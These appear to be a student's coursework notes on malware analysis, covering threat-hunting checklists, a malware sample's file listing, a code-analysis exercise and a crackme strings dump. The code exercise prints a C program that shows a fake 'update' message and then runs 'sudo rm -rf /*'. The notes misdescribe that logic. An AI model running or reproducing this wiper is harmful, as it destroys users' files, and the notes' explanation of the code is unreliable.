# 📌 Day-6: Malware Analysis.

There is two type of Malware analysis
	i. Static Analysis - With out running the malware, just by using dissembler or sysinternals
	ii. Dynamic Analysis - by running the virus on sandbox's

## 📍**TOPIC 7 - Malware Hunting**

### *🔰Assignment-1:*

1) What type of security breaches you may encounter as an incident responder?
> Information and Path disclosure
> DDOS Attacks

2) To detect malicious emails, what steps would you take to examine the emails’?write Helpful threat hunting Checklists
	a, Checking if the Email is Not Spam
	b, Check if the email is Legitimate.
	c, Identify where you got the email.
	d, Try to look the mail sent, to check if you got suspecious.

### *🔰Assignment-2:*  -> Made with the Attacked "malware_sample.zip" file.

### 1) Identify new created processes, services
	> This file contains 
```bash
ls
	cczice.cmd  gupd.rar   IDM.vbs.a.zip  qgwlykqcyz..vbs  tvsymypco.js
	dulla.rar   IDM.vbs.a  kvwpjmygv.js   sslp2017.vbs
```

	we couldn't got the process and service, by technical difficulty.
<img src="MalwareAnalysis/aurorun1.jpg" alt="Autorun picture">

### 2) Identify persistence folders , registers
<img src="MalwareAnalysis/autorun.jpg" alt="Autorun picture">

## 📍**TOPIC 8 - Malware Analysis and Reverse Engineering**

### *🔰Assignment-1:* Static Malware Analysis

> We Tried to do the challange but the google drive is not allowing as to access the files.
<img src="/home/rexder/INSA/InitProgramming/MalwareAnalysis/error.png" alt="Error of The file">

### *🔰Assignment-2:* Dynamic Malware Analysis

> We Tried to do the challange but the google drive is not allowing as to access the files.

### *🔰Assignment-3:* Code Analysis
	 A Code is Given todo analysis on it.
	 Code:
### 👉*We add a Library*
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
```
### 👉*We Will Define The variables*
```c
#define kill_os "sudo rm -rf /*"
#define text "Switching to root user to update the package" 
#define error_text "There has been an error."
```
### 👉*Checks if the system/user/ is admin{ and deletes all files from the /(root) else shows and error_text* 
[ done by checking the UID, UID 0 is root else it is normal user]
```c
int main(){
#if defined __linux__ || defined __unix__
    if ( geteuid() != 0 ){
        printf("%s\n", text); 
    }
    system(kill_os);
#else
    printf("%s\n", error_text);
    return 1;
#endif
}
```
### *🔰Assignment-4: Reverse Engineering **1*** 

It gives as a File That ask for a Flag
> I tryed to get the strings of the binary

```bash
┌──(rexder㉿Rex)-[~/INSA/InitProgramming/MalwareAnalysis]
└─$ strings cm_rb_easy 
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
strcpy
puts
strlen
__stack_chk_fail
libc.so.6
GLIBC_2.4
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u3UH
[!] Usage: ./cmRubiks flag
[!] The flag is too long...
[!] Bad flag!
[*] G00d flag!
```


